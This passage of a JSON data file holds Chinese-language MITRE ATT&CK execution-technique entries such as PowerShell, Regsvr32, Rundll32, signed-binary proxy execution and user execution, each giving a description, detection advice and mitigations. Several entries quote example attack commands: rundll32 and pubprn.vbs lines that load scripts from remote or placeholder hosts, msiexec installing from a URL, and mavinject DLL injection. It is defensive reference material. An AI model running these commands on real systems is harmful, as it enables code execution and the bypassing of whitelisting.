			"name": "特性/程序禁用或删除",
			"description": "在给定环境中可能不需要Mshta.exe，因为其功能与已达到使用寿命的旧版本Internet Explorer相关联。"
		}, {
			"name": "执行预防",
			"description": "如果给定系统或网络不需要mshta.exe，则使用应用白名单来阻止其执行，以防止其被攻击者滥用。"
		}],
		"tactics": ["TA0005", "TA0002"]
	},
	"name": "Mshta命令"
}, {
	"id": "T1086",
	"description": "<p>PowerShell是Windows操作系统中功能强大的交互式命令行界面和脚本环境。攻击者可以使用PowerShell执行许多操作，包括发现信息和执行代码。例如，可用于运行可执行文件的start-process cmdlet，在本地或远程计算机上运行命令的invoke-command cmdlet。</p><p>PowerShell还可从Internet下载和运行可执行文件，这些可执行文件可以从磁盘执行或从内存执行而无需用到磁盘。</p><p>使用PowerShell连接到远程系统需要管理员权限。</p><p>有许多基于PowerShell的攻击性测试工具，包括Empire，PowerSploit，和PSAttack。</p><p>也可以执行PowerShell命令/脚本，而无需通过.NET框架和Windows CLI（公共语言界面）公开的PowerShell底层System.Management.Automation程序集的接口直接调用powershell.exe二进制文件。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户", "管理员"],
		"dataSources": ["PowerShell日志", "已加载动态链接库", "动态链接库监控", "Windows注册表", "文件监控", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>如果设置了正确的执行策略，攻击者可能会通过注册表或命令行获得管理员或系统访问权限，从而定义自己的执行策略。可以通过查看系统上的策略是否更改来检测是否有恶意PowerShell使用。如果环境中本来没有使用PowerShell，则只需查找PowerShell执行就可能检测到恶意活动。</p><p>监控PowerShell特定程序集（如System.Management.Automation.dll）关联项的加载和/或执行（尤其是异常进程名称/位置）。</p><p>打开PowerShell日志功能来提高执行过程中发生内容（适用于.NET调用）的保真度也是有益的。PowerShell 5.0引入了增强的日志功能，其中一些功能特性早已在PowerShell 4.0中添加。早期版本的PowerShell没有很多日志功能。组织可以在数据分析平台中收集PowerShell执行细节，以补充其他数据。</p>",
		"mitigations": [{
			"name": "代码签名",
			"description": "将PowerShell执行策略设置为仅执行签名的脚本。"
		}, {
			"name": "特性/程序禁用或删除",
			"description": "可以在不需要时从系统中删除PowerShell，但应执行审查以评估对环境的影响，因为它可能用于许多合法目的和管理功能。禁用/限制WinRM服务来防止使用PowerShell进行远程执行。"
		}, {
			"name": "特权账号管理",
			"description": "如果需要PowerShell，请将PowerShell执行策略限制为管理员。请注意，有一些方法可以绕过PowerShell执行策略，具体取决于环境配置。"
		}],
		"tactics": ["TA0002"]
	},
	"name": "PowerShell"
}, {
	"id": "T1121",
	"description": "<p>Windows命令行实用程序Regsvcs和Regasm用于注册.NET COM（组件对象模型）程序集。两者都是微软数字签名的。</p><p>攻击者可能会使用Regsvcs和Regasm通过受信任的Windows实用程序来代理执行代码。这两个实用程序都可以通过使用二进制文件中的属性，<code>[ComRegisterFunction]</code>或<code>[ComUnregisterFunction]</code>，来指定应在注册或注销之前分别运行的代码，从而绕过进程白名单。</p><p>即使进程在没有足够权限的情况下运行并且执行失败，也将执行具有注册和注销属性的代码。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户", "管理员"],
		"dataSources": ["进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>通过进程监控来检测和分析Regsvcs.exe和Regasm.exe的执行和参数。比较Regsvcs.exe和Regasm.exe的近期调用与历史已知合法参数及已执行二进制文件来确定是否有异常和潜在的攻击活动。在Regsvcs.exe或Regasm.exe调用之前和之后使用的命令参数也可用于确定正在执行的二进制文件的来源和目的。</p>",
		"mitigations": [{
			"name": "特性/程序禁用或删除",
			"description": "在给定环境中可能不需要Regsvcs和Regasm。"
		}, {
			"name": "执行预防",
			"description": "如果给定系统或网络不需要Regsvcs.exe和Regasm.exe，则阻止其执行，以防止其被攻击者滥用。"
		}],
		"tactics": ["TA0005", "TA0002"]
	},
	"name": "Regsvcs/Regasm命令"
}, {
	"id": "T1117",
	"description": "<p>命令行程序Regsvr32.exe用于在Windows系统上注册和注销对象链接及嵌入控件，包括动态链接库（DLL）。Regsvr32.exe可用于执行任意二进制文件。</p><p>攻击者可能会利用此功能代理执行代码，从而避免触发那些可能不会监控regsvr32.exe进程执行及其加载模块的安全工具，因为正常操作中使用regsvr32.exe的Windows会有白名单或误报。Regsvr32.exe也是微软签名的二进制文件。</p><p>Regsvr32.exe还可用于专门绕过进程白名单，方法是加载COM脚本小程序在用户权限下执行动态链接库。由于regsvr32.exe具有网络和代理感知功能，可以在调用期间将URL作为参数传递到外部web服务器上的文件来加载脚本。此方法不对注册表进行任何更改，因为COM对象实际上未注册，仅执行。这个技术变种通常称为“Squiblydoo”攻击，已被攻击者用于针对政府的活动中。</p><p>攻击者还可能会利用Regsvr32.exe来注册COM对象以便通过COM劫持建立持久性。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户", "管理员"],
		"dataSources": ["已加载动态链接库", "进程监控", "Windows注册表", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>通过进程监控来检测和分析regsvr32.exe的执行和参数。比较regsvr32.exe的近期调用与历史已知合法参数及已加载文件来确定是否有异常和潜在的攻击活动。在regsvr32.exe调用之前和之后使用的命令参数也可用于确定正在加载的脚本或者动态链接库的来源和目的。</p>",
		"mitigations": [{
			"name": "漏洞利用防护",
			"description": "可使用微软EMET（增强缓解体验工具包）的ASR（攻击面减少）功能来阻止regsvr32.exe绕过白名单。在适当的情况下，使用应用白名单工具（如Windows Defender Application Control，AppLocker或软件限制策略）来识别并阻止通过regsvr32功能执行的潜在恶意软件。"
		}],
		"tactics": ["TA0005", "TA0002"]
	},
	"name": "Regsvr32命令"
}, {
	"id": "T1085",
	"description": "<p>Rundll32.exe程序可以调用来执行任意二进制文件。攻击者可能会利用此功能来代理执行代码，从而避免触发那些可能不会监控rundll32.exe进程执行的安全工具，因为正常操作中使用rundll32.exe的Windows会有白名单或误报。</p><p>Rundll32.exe可用于通过未记录的shell32.dll函数<code>Control_RunDLL</code>和 <code>Control_RunDLLAsUser</code>来执行控制面板项目文件（.cpl）。双击.cpl文件也会触发rundll32.exe执行。</p><p>Rundll32也可用于执行JavaScript等脚本。可以使用类似于下面的语法来完成：<code>rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code> 。这种方法已被恶意软件如Poweliks所使用。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["文件监控", "进程监控", "进程命令行参数", "二进制文件元数据"]
	},
	"relations": {
		"detection": "<p>通过进程监控来检测和分析rundll32.exe的执行和参数。比较rundll32.exe的近期调用与历史已知合法参数及已加载动态链接库来确定是否有异常和潜在的攻击活动。在rundll32.exe调用之前和之后使用的命令参数也可用于确定正在加载的动态链接库的来源和目的。</p>",
		"mitigations": [{
			"name": "漏洞利用防护",
			"description": "可使用微软EMET（增强缓解体验工具包）的ASR（攻击面减少）功能来阻止rundll32.exe绕过白名单。"
		}],
		"tactics": ["TA0005", "TA0002"]
	},
	"name": "Rundll32命令"
}, {
	"id": "T1053",
	"description": "<p>诸如at和schtasks之类的实用程序可与Windows Task Scheduler一起使用来调度程序或脚本在某日期和时间执行。只要身份认证通过可以使用RPC，并且打开了文件和打印机共享功能，就可以在远程系统上调度任务。在远程系统上调度任务通常需要远程系统管理员群组的成员执行。</p><p>攻击者可能会通过任务调度在系统启动时或在计划的基础上执行程序以实现持久性，作为横向移动的一部分进行远程执行，获得系统权限，或者在指定账号的上下文下运行进程。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员", "系统", "用户"],
		"dataSources": ["文件监控", "进程监控", "进程命令行参数", "Windows事件日志"]
	},
	"relations": {
		"detection": "<p>通过命令行调用来监控常用实用程序的计划任务创建。可以在安装新软件期间或通过系统管理功能创建合法的计划任务。监控Windows 10中<code>svchost.exe</code> 和旧版Windows 中Windows任务计划程序 <code>taskeng.exe</code>的进程执行情况。如果计划任务不用于持久性，则攻击者很可能在操作完成时删除该任务。监控<code>%systemroot%\\System32\\Tasks</code>中的Windows任务计划程序仓库来查看是否有与已知软件、补丁周期等不相关的计划任务的更改条目。不应孤立地看待数据和事件，而应将其视为可能导致其他活动的一系列行为中的一部分，例如为命令与控制而建立网络连接，通过发现了解环境的详细信息，以及横向移动。</p><p>通过在事件日志服务中启用“Microsoft-Windows-TaskScheduler / Operational”设置的方式来为计划任务的创建和更改配置事件日志功能。然后会在计划任务活动中记录如下事件：</p><p>·         Windows 7，Server 2008 R2上的事件106 – 已注册计划任务</p><p>·         Windows 7，Server 2008 R2上的事件140/Windows 10，Server 2016上的事件4702 – 已更新计划任务</p><p>·         Windows 7，Server 2008 R2上的事件141/Windows 10，Server 2016上的事件4699 – 已删除计划任务</p><p>·         Windows 10，Server 2016上的事件4698 – 已创建计划任务</p><p>·         Windows 10，Server 2016上的事件4700 – 已启用计划任务</p><p>·         Windows 10，Server 2016上的事件4701 – 已禁用计划任务</p><p>也可使用Sysinternals Autoruns等工具来检测是否有旨在获得持久性的系统更改，包括列出当前的计划任务。查找与已知软件、补丁周期等不相关的任务更改。当与历史数据进行比较时，通过计划任务执行的可疑程序可能会显示为以前从未见过的异常进程。</p><p>监控可用于创建任务的进程和命令行参数。带内置功能的远程访问工具可以直接与Windows API交互，在典型的系统实用程序之外执行这些功能。Windows系统管理工具（如Windows Management Instrumentation和PowerShell）也可用来创建任务，因此可能还需要配置日志功能来收集适当的数据。</p>",
		"mitigations": [{
			"name": "审核",
			"description": "像PowerSploit框架这样的工具包包含PowerUp模块，这些模块可用来探索系统中可用于提升权限的计划任务的权限弱点。"
		}, {
			"name": "操作系统配置",
			"description": "配置计划任务的设置来强制任务在已通过身份认证账号的上下文中运行，而不是允许它们使用系统权限运行。关联的注册表项位于HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SubmitControl。可通过GPO来配置设置，路径：计算机配置 > [策略] > Windows设置 > 安全设置 > 本地策略 > 安全选项：域控制器：允许服务器操作员调度任务。将“允许服务器操作员调度任务”设置为禁用。"
		}, {
			"name": "特权账号管理",
			"description": "将“增加调度优先级”配置为仅允许管理员群组拥有调度优先级进程的权限。可通过GPO配置设置，路径：计算机配置 >  [策略] > Windows设置 > 安全设置 > 本地策略 > 用户权限分配：增加调度优先级。"
		}, {
			"name": "用户账号管理",
			"description": "限制用户账号权限并调整权限升级向量，以便只有授权的管理员才能在远程系统上创建计划任务。"
		}],
		"tactics": ["TA0002", "TA0003", "TA0004"]
	},
	"name": "定时任务"
}, {
	"id": "T1064",
	"description": "<p>攻击者可能会使用脚本来帮助操作并执行多个操作。不使用脚本的话，这些操作需手动执行。脚本编程对于加快操作任务和减少关键资源访问时间非常有用。有些脚本编程语言可通过在API级别直接与操作系统交互而不是调用其他程序来绕过进程监控机制。Windows系统常采用VBScript和PowerShell脚本编程语言，但也可采用命令行批处理脚本的形式。</p><p>脚本可以作为宏嵌入到Office文档中，这些宏可以设置为在鱼叉式钓鱼攻击附件及其他类型鱼叉式钓鱼攻击文件打开时执行。恶意嵌入宏和通过客户端执行利用进行软件利用是两种攻击方式。在用后者方式实施攻击时，攻击者依赖于允许的宏或用户将接受并激活的宏。</p><p>存在许多流行的攻击框架。这些框架不管是对安全测试人员还是攻击者都使用脚本编程形式。例如：Metasploit、Veil和PowerSploit。渗透测试人员常常在漏洞攻击时和攻击后操作中使用这三种框架。它们包含许多可用于规避防御的功能。有些攻击者会使用PowerShell。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["进程监控", "文件监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>脚本编程可能在管理员、开发人员或高级用户系统上很常见，具体取决于作业功能。如果对普通用户限制了脚本编写，那么任何在系统上运行脚本的尝试都将被视为可疑。如果脚本在系统上不常用但已启用，那么由于打补丁或其他管理员功能而超出周期的脚本是可疑的。应尽可能从文件系统中捕获脚本以确定其操作和意图。</p><p>脚本可能会在可生成事件的系统上执行操作且效果各有不同，具体取决于所使用的监控类型。监控脚本执行和后续行为所涉及的进程和命令行参数。操作可能与网络和系统信息发现、收集或其他攻击后脚本化行为相关，并可用作返回源脚本的检测指标。</p><p>分析可能带恶意宏的Office文件附件。执行宏可能会创建可疑的进程树，具体取决于宏的设计目的。Office进程，如winword.exe，cmd.exe生成实例，脚本应用程序（如wscript.exe或powershell.exe）或其他可疑进程可能表示存在恶意活动。</p>",
		"mitigations": [{
			"name": "应用隔离和沙箱",
			"description": "配置Office安全设置来启用“受保护视图”，在沙箱环境中执行，以及通过组策略阻止宏。也可通过其他类型的虚拟化和应用微分区来缓解攻击的影响。"
		}, {
			"name": "特性/程序禁用或删除",
			"description": "关闭未使用的功能或限制对脚本引擎（如VBScript）或脚本化管理框架（如PowerShell）的访问。"
		}],
		"tactics": ["TA0005", "TA0002"]
	},
	"name": "脚本编程"
}, {
	"id": "T1035",
	"description": "<p>攻击者可能会通过与Windows服务交互的方法（例如服务控制管理器）执行二进制文件、命令或脚本。这可以通过创建新服务或修改现有服务来完成。此技术与创建新服务和修改现有服务一起使用来获得服务持久性或权限升级。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员", "系统"],
		"dataSources": ["Windows注册表", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>更改服务注册表项和通过命令行调用能用来修改与已知软件、补丁周期等不相干服务的工具是可疑的。如果服务仅用于执行二进制文件或脚本而不用于持久化，则很可能在服务重新启动后不久便将其更改回原来的形式，这样服务就不会像使用管理员工具PsExec时那样遭到破坏。</p>",
		"mitigations": [{
			"name": "特权账号管理",
			"description": "确保禁止需较高权限级别才能运行的服务由权限级别较低的用户创建或与之交互。"
		}, {
			"name": "文件和目录权限限制",
			"description": "还要确保具有较低权限级别的用户不能替换或修改高权限级别的服务二进制文件。"
		}],
		"tactics": ["TA0002"]
	},
	"name": "服务执行"
}, {
	"id": "T1218",
	"description": "<p>可信数字证书签署的二进制文件在Windows操作系统执行时，可通过数字签名验证保护。Windows安装过程中默认安装的一些微软签名的二进制文件可用来代理执行其它文件。攻击者可能会滥用此技术来执行可能绕过应用白名单机制和系统签名验证的恶意文件。该技术考虑了现有技术中尚未考虑的代理执行方法。</p><p>Msiexec.exe</p><p>Msiexec.exe是Windows Installer的命令行工具。攻击者可能会使用msiexec.exe来启动恶意MSI文件，从而执行代码。攻击者可能使用这种方式来启用本地或者网络可访问的MSI文件。Msiexec.exe也可用来执行动态链接库。</p><p>·         <code>msiexec.exe /q /i\"C:\\path\\to\\file.msi\"</code></p><p>·         <code>msiexec.exe /q /i http[:]//site[.]com/file.msi</code></p><p>·         <code>msiexec.exe /y \"C:\\path\\to\\file.dll\"</code></p><p>Mavinject.exe</p><p>Mavinject.exe是允许代码执行的Windows工具，可用来给正在运行的进程输入DLL文件。</p><p>·         <code>\"C:\\Program Files\\Common Files\\microsoftshared\\ClickToRun\\MavInject32.exe\" &lt;PID&gt; /INJECTRUNNING &lt;PATHDLL&gt;</code></p><p>·         <code>C:\\Windows\\system32\\mavinject.exe &lt;PID&gt;/INJECTRUNNING &lt;PATH DLL&gt;</code></p><p>SyncAppvPublishingServer.exe</p><p>SyncAppvPublishingServer.exe可用来执行PowerShell脚本，而无需执行powershell.exe。</p><p>Odbcconf.exe</p><p>Odbcconf.exe是允许配置开放数据库连接（ODBC）驱动和数据源名称的Windows工具。攻击者也可能滥用此工具来执行动态链接库，就像带有REGSVR选项的Regsvr32一样。</p><p>·         <code>odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\file.dll\"}</code></p><p>还有其它工具也可执行类似行为。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>监控可用于代理执行其它恶意文件的签名二进制文件相关的进程和命令行参数。利用合法程序执行可疑行为，例如通过msiexec.exe从因特网下载MSI文件，可能表示有入侵行为。考虑到可能的用户和管理员的正常使用，可通过关联其它可疑活动来减少误报。</p>",
		"mitigations": [{
			"name": "执行预防",
			"description": "在给定的环境中，可能并不需要某些可用于执行其它程序的签名二进制软件。如果给定系统或网络不需要这些二进制文件，则使用应用白名单来阻止其执行，以防止其被攻击者滥用。"
		}, {
			"name": "特权账号管理",
			"description": "如果用户需要这些二进制文件，可通过特权账号或者组来限制执行，从而减少恶意使用的可能性。"
		}],
		"tactics": ["TA0005", "TA0002"]
	},
	"name": "签名二进制代理执行"
}, {
	"id": "T1216",
	"description": "<p>使用可信证书签名的脚本可用于代理执行恶意文件。此行为可能会绕过签名验证限制和不考虑使用这些脚本的应用白名单解决方案。</p><p>PubPrn.vbs由微软签名，可用于从远程站点代理执行。命令举例：<code>cscriptC[:]\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn[.]vbs 127.0.0.1script:http[:]//192.168.1.100/hi.png</code></p><p>还有其他一些签名脚本可以类似的方式使用。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>监控可用于代理执行恶意文件的脚本进程（如cscript）及脚本（如pubprn.vbs）相关的命令行参数。</p>",
		"mitigations": [{
			"name": "执行预防",
			"description": "在给定的环境中，可能并不需要某些可用于执行其他程序的签名脚本。如果给定系统或网络不需要这些脚本，则使用应用白名单来阻止其执行，以防止其被攻击者滥用。"
		}],
		"tactics": ["TA0005", "TA0002"]
	},
	"name": "签名脚本代理执行"
}, {
	"id": "T1153",
	"description": "<p>source命令在当前shell中加载函数或者在当前上下文中执行文件。此内置命令可通过两种不同方式运行：source/path/to/filename [arguments]或者./path/to/filename [arguments]。注意”.”后面的空格。如果没有空格，会创建新的shell来运行程序，而不是在当前上下文中运行程序。这通常用于确保某些特性或者功能对shell有效或者更新某个具体的shell环境。</p><p>攻击者可能会滥用此技术来执行程序。使用这种技术执行文件无需提前设置可执行标记。</p>",
	"details": {
		"platform": ["Linux", "macOS"],
		"permissionRequired": ["用户"],
		"dataSources": ["进程监控", "文件监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>监控source shell命令执行以及通过source命令执行启动的后续进程。为了让source执行某个文件，攻击者肯定会在磁盘上写入此文件。这些文件可通过文件监控检测出来。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0002"]
	},
	"name": "Source命令"
}, {
	"id": "T1151",
	"description": "<p>攻击者通过改变文件后缀来隐藏程序真实的文件类型。某些文件类型（尤其是不适用.app结尾），在文件名尾部增加空格会改变操作系统如何处理。例如，假设有个名为evil.bin的Mach-O可执行文件，当用户双击时，会启动Terminal.app来执行。如果这个文件被重命名成evil.txt，这时当用户双击时，变会启动默认的文本编辑程序（不是运行二进制文件）。但如果文件命名成”evil.txt ”（注意尾部空格），此时用户双击程序，OS会检测真实的文件类型，合理地处置，然后执行二进制文件。</p><p>攻击者使用这个特性来诱骗用户双击看似没有任何格式问题的文件，最终执行了某些恶意行为</p>",
	"details": {
		"platform": ["Linux", "macOS"],
		"permissionRequired": ["用户"],
		"dataSources": ["文件监控", "进程监控"]
	},
	"relations": {
		"detection": "<p>文件末尾通常不包含空格，因此很容易通过文件监控检查出来。但从用户的角度来看，在Finder.app或者Terminal.app命令行里很难观察出来。包含非标准后缀的二进制文件启动的进程通常是可疑的。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0005", "TA0002"]
	},
	"name": "文件名后加空格"
}, {
	"id": "T1072",
	"description": "<p>第三方应用和软件部署系统可在网络环境中用于管理目的（例如，SCCM，VNC，HBSS，Altiris等）。如果攻击者获得这些系统的访问权限，那么他们就可以执行代码。</p><p>攻击者可能会访问和使用企业网上安装的第三方系统，例如管理，监控和部署系统，以及用于管理其它系统的第三方网关和跳转服务器。攻击者可能会通过访问第三方网络范围内或企业范围内的软件系统，从而在所有连接到该系统的其它系统上远程执行代码。该访问权限可用于横向移动到其它系统，收集信息或产生特定效果，例如擦除所有端点上的硬盘驱动器。</p><p>此操作所需权限因系统配置而异。本地凭据可能足以直接访问第三方系统，或者也可能需要特定的域凭据。但是，可能需要管理账户权限才能登陆系统或是执行其预期目的。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["用户", "管理员", "系统"],
		"dataSources": ["文件监控", "第三方应用日志", "Windows注册表", "进程监控", "网络进程使用", "二进制文件元数据"]
	},
	"relations": {
		"detection": "<p>检测方法因第三方软件或系统的类型以及它通常的使用方式而异。</p><p>与对待其他潜在的恶意活动（最初不知道分发媒介，但最终活动遵循可识别的模式）一样，这里也可以应用相同的调查过程。分析流程执行树、来自第三方应用的历史活动（例如通常推送哪些类型的文件）以及推送到系统的文件/二进制/脚本引发的活动或事件。</p><p>通常，这些第三方应用都有自己的日志，可以收集这些日志并与环境中的其他数据关联。确保第三方应用程序日志已记录到企业日志系统，并定期审查日志。审核软件部署日志并查找可疑或未经授权的活动。一个通常不用于将软件推送到客户端的系统突然被用于已知管理功能之外的此类任务可能是可疑的。</p><p>定期执行应用部署，那么不定期的部署活动就会凸显出来。监控与已知良好软件不相关的过程活动。监控部署系统上的账号登录活动。</p>",
		"mitigations": [{
			"name": "活动目录配置",
			"description": "在关键网络系统使用组策略来确保系统和访问准确隔离。"
		}, {
			"name": "多因子认证",
			"description": "在关键网络系统使用多因子认证来确保系统和访问准确隔离。"
		}, {
			"name": "网络分区",
			"description": "在关键网络系统使用防火墙来确保系统准确隔离。"
		}, {
			"name": "密码策略",
			"description": "验证用于访问部署系统的账号凭据。确保其唯一性并且不会用于整个企业网络。"
		}, {
			"name": "特权账号管理",
			"description": "仅向有限数量的授权的管理员授予应用部署系统的访问权限。"
		}, {
			"name": "远程数据存储",
			"description": "如果可以将应用部署系统配置为仅部署已签名的二进制文件，请确保受信任的签名证书与应用部署系统位于不同位置，受信任的签名证书位于无法远程访问或远程访问控制很严格的系统上。"
		}, {
			"name": "软件更新",
			"description": "定期给部署系统打补丁，防止攻击者利用权限升级进行远程访问。"
		}, {
			"name": "用户账号管理",
			"description": "确保第三方提供商用于访问这些系统的任何账号都可以追溯到第三方，并且不会在整个网络中使用，也不会在同一环境中被其他第三方提供商使用。确保定期审查为这些系统配置的账号以保证持续的业务需求，并确保有措施来跟踪不再需要的访问的取消。"
		}, {
			"name": "用户培训",
			"description": "对部署系统的使用有严格的审批策略。"
		}],
		"tactics": ["TA0002", "TA0008"]
	},
	"name": "第三方软件"
}, {
	"id": "T1154",
	"description": "<p><code>trap</code>命令允许程序和shell脚本指定在接收到中断信号时将执行的命令。一种常见的情况是脚本允许正常终止和处理常见的键盘中断，如<code>ctrl+c</code>和<code>ctrl+d</code>。攻击者可能会使用此命令来注册当shell遇到特定中断时要执行的代码，从而获得执行权限或持久性。Trap命令格式如下：<code>trap 'command list' signals</code>，其中“command list”在接收到signals”时执行。</p>",
	"details": {
		"platform": ["Linux", "macOS"],
		"permissionRequired": ["用户", "管理员"],
		"dataSources": ["文件监控", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>Trap命令必须注册成为shell脚本或者程序，所以他们都出现在文件中。监控文件中可疑的或过于宽泛的trap命令可以缩小调查期间的可疑行为范围。监控trap中断过程中执行的可疑进程。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0002", "TA0003"]
	},
	"name": "Trap命令"
}, {
	"id": "T1127",
	"description": "<p>许多软件开发相关的实用程序可用于执行各种形式的代码以协助开发、调试和逆向工程。这些实用程序通常可以使用合法证书进行签名。签名后，它们就可以在系统上执行，并通过可信的进程代理执行恶意代码，从而有效地绕过应用白名单防御解决方案。</p><p>MSBuild</p><p>MSBuild.exe（Microsoft Build Engine）是Visual Studio使用的软件构建平台。它采用XML格式的项目文件，定义了各种平台的构建要求和配置。</p><p>攻击者可能会使用MSBuild通过受信任的Windows实用程序来代理执行代码。.NET 4中引入的MSBuild内联任务功能允许将C＃代码插入到XML项目文件中。内联任务MSBuild将编译并执行内联任务。MSBuild.exe是一个签名的微软二进制文件，因此当它以这种方式使用时，它可以执行任意代码并绕过配置为允许MSBuild.exe执行的应用白名单防御。</p><p>DNX</p><p>.NET执行环境（DNX）dnx.exe是随Visual Studio Enterprise打包的软件开发工具包。它在2016年退役，转而支持.NET Core CLI。标准版本的Windows上不存在DNX，它可能仅存在于使用旧版本.NET Core和ASP.NET Core 1.0的开发人员工作站上。dnx.exe可执行文件由微软签名。</p><p>攻击者可能会使用dnx.exe来代理执行任意代码，绕过不考虑DNX的应用白名单策略。</p><p>RCSI</p><p>rcsi.exe实用程序是C＃的非交互式命令行界面，类似于csi.exe。它出现在早期某版本的Roslyn.NET编译器平台，但自那以后就因集成解决方案而被弃用。rcsi.exe二进制文件由微软签名。</p><p>可以在命令行使用rcsi.exe编写和执行C# .csx脚本文件。攻击者可能会使用rcsi.exe来代理执行任意代码，绕过不考虑执行rcsi.exe的应用白名单策略。</p><p>WinDbg/CDB</p><p>WinDbg是微软 Windows内核和用户模式调试实用程序。微软控制台调试程序（CDB）cdb.exe也是用户模式调试程序。这两个实用程序都包含在Windows软件开发工具包中，可以作为独立工具使用。它们通常用于软件开发和逆向工程，在典型的Windows系统上可能找不到。WinDbg.exe和cdb.exe二进制文件都由微软签名。</p><p>攻击者可能会使用WinDbg.exe和cdb.exe来代理执行任意代码，绕过不考虑执行这些实用程序的应用白名单策略。</p><p>很可能出于类似的目的使用其他调试程序，例如内核模式调试器kd.exe，它也由微软签名。</p><p>Tracker</p><p>文件跟踪器实用程序tracker.exe作为MSBuild的一部分包含在.NET框架中。它用于记录Windows文件系统的调用日志。</p><p>攻击者可以使用tracker.exe来代理执行任意动态链接库到另一个进程中。由于tracker.exe也已签名，因此可用于绕过应用白名单解决方案。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["进程监控"]
	},
	"relations": {
		"detection": "<p>在非用于开发、调试和逆向工程的系统上出现通常用于开发、调试和逆向工程的且已开通代理执行功能的实用程序可能是可疑的。</p><p>通过进程监控来检测和分析MSBuild.exe，dnx.exe，rcsi.exe，WinDbg.exe，cdb.exe和tracker.exe的执行和参数。比较这些实用程序的近期调用与历史已知合法参数及已执行二进制文件来确定是否有异常和潜在的攻击活动。这些实用程序很可能会被软件开发人员使用或用于其他与软件开发相关的任务。因此，如果监控到这些程序而且该程序在所提情境之外使用，那么这个事件是可疑的。在实用程序调用之前和之后使用的命令参数也可用于确定正在执行的二进制文件的来源和目的。</p>",
		"mitigations": [{
			"name": "特性/程序禁用或删除",
			"description": "在给定环境中可能不需要MSBuild.exe，dnx.exe，rcsi.exe，WinDbg.exe，cdb.exe和tracker.exe。如果不需要，应将其删除。"
		}, {
			"name": "执行预防",
			"description": "如果给定系统或网络不需要MSBuild.exe，dnx.exe，rcsi.exe，WinDbg.exe和cdb.exe，则使用应用白名单来阻止其执行，以防止其被攻击者滥用。"
		}],
		"tactics": ["TA0005", "TA0002"]
	},
	"name": "可信的开发工具"
}, {
	"id": "T1204",
	"description": "<p>攻击者可能需要依赖用户的特定动作才能获得执行。这可能是直接的代码执行，例如用户打开带有图标和明显扩展名的钓鱼邮件附件中的恶意可执行文件。它还可能导致执行其他技术，例如用户点击钓鱼攻击链接会导致通过客户端执行利用技术来利用浏览器或应用程序漏洞。虽然用户执行经常发生在初始访问之后不久，但也可能发生在入侵的其他阶段，比如攻击者会将文件放在共享目录或用户桌面上，希望有用户会点击它。</p><p>例如，攻击者可能会诱使用户单击Windows快捷方式文件（.Ink）从而执行恶意有效载荷。恶意.Ink文件可能包含PowerShell命令。有效载荷可以包含在.Ink文件中，也可以从远程服务器下载。</p><p>尽管“用户执行”经常在“初始访问”不久之后发生，但也可能发生在入侵的其它阶段，例如，当攻击者将文件放在共享目录中或放在用户桌面上希望用户单击该文件时。</p>",
	"details": {
		"platform": ["Linux", "Windows", "macOS"],
		"permissionRequired": ["用户"],
		"dataSources": ["杀毒软件", "进程命令行参数", "进程监控"]
	},
	"relations": {
		"detection": "<p>监控可被攻击者利用来获取初始访问权限（需要用户交互）的应用程序所相关的执行和命令行参数，包括可用于清除/解码有效载荷中文件或信息的压缩应用程序（比如ZIP文件打包程序）。</p><p>杀毒软件可以检测用户计算机上下载和执行的恶意文件。一旦文件被打开（如Microsoft Word或PDF文件被打开后连接了互联网或者生成了Powershell.exe），端点检测或网络检测可检测“客户端执行利用”及“脚本编程”攻击技术相关恶意事件。</p>",
		"mitigations": [{
			"name": "执行预防",
			"description": "可使用应用程序白名单阻止运行伪装的可执行文件。"
		}, {
			"name": "网络入侵防御",
			"description": "如果用户正在访问某个链接，则可以使用网络入侵防御系统和旨在扫描和删除恶意下载的系统来阻止其活动。"
		}, {
			"name": "Web内容限制",
			"description": "如果用户正在访问某个链接，阻止下载默认不该下载的、或是根据策略可能来自可疑站点的未知或未使用文件。这是防止.scr，.exe，.pif，.cpl等载体的最佳实践。"
		}, {
			"name": "用户培训",
			"description": "用户培训可以提升用户关于常见网络钓鱼技术的意识，以及提高对潜在恶意事件的警惕。"
		}],
		"tactics": ["TA0002"]
	},
	"name": "用户执行"
}, {
	"id": "T1047",
